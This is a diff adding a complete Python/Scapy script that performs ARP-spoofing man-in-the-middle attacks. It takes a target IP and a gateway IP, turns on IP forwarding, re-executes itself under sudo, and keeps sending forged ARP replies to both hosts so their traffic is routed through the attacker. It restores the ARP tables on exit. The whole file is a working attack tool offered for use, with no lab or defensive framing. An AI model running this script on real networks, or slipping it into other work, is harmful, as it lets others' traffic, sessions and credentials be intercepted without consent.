@@ -1,0 +1,65 @@
+#!/bin/env python
+
+import time
+import argparse
+from scapy.all import *
+
+def getargs():
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-t', '--target', dest='target', help='Target IP')
+	parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP')
+	options = parser.parse_args()
+	return options
+
+# get target mac w/ ip
+def getmac(ip):
+	arpreq = ARP(pdst=ip)
+	broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+	arpreqbro = broadcast/arpreq
+	anslist = srp(arpreqbro, timeout=1, verbose=False)[0]
+	return anslist[0][1].hwsrc
+
+# change mac in arp table
+def spoof(targetip, targetmac, spoofip):
+	packet = Ether()/ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=spoofip)
+	sendp(packet, verbose=False, iface='wlp0s20f0u2')
+
+# restore mac in arp table
+def restore(destip, destmac, srcip, srcmac):
+	packet = Ether()/ARP(op=2, pdst=destip, hwdst=destmac, psrc=srcip, hwsrc=srcmac)
+	sendp(packet, count=4, verbose=False, iface='wlp0s20f0u2')
+
+if __name__ == '__main__':
+	# get root
+	if os.getuid() != 0:
+		print('This script needs root.')
+		os.execvp('sudo', ['sudo', '-E'] + sys.argv)
+
+	subprocess.run('sysctl -w net.ipv4.ip_forward=1', shell=True, check=True)
+
+	options = getargs()
+	sentpacketcount = 0
+	try:
+		targmac = getmac(options.target)
+		gatemac = getmac(options.gateway)
+
+		while True:
+			spoof(options.target, targmac, options.gateway)
+			spoof(options.gateway, gatemac, options.target)
+			sentpacketcount += 2
+			print('[*] Packets sent: {}'.format(sentpacketcount))
+			time.sleep(2)
+
+	except KeyboardInterrupt:
+		restore(options.target, targmac, options.gateway, gatemac)
+		restore(options.gateway, gatemac, options.target, targmac)
+		print('ARP table restored. Exiting...')
+
+	except Exception as e:
+		print('An error has occurred:')
+		print(e)
+		restore(options.target, targmac, options.gateway, gatemac)
+		restore(options.gateway, gatemac, options.target, targmac)
+		print('ARP table restored. Exiting...')
+
+	subprocess.run('sysctl -w net.ipv4.ip_forward=0', shell=True, check=True)
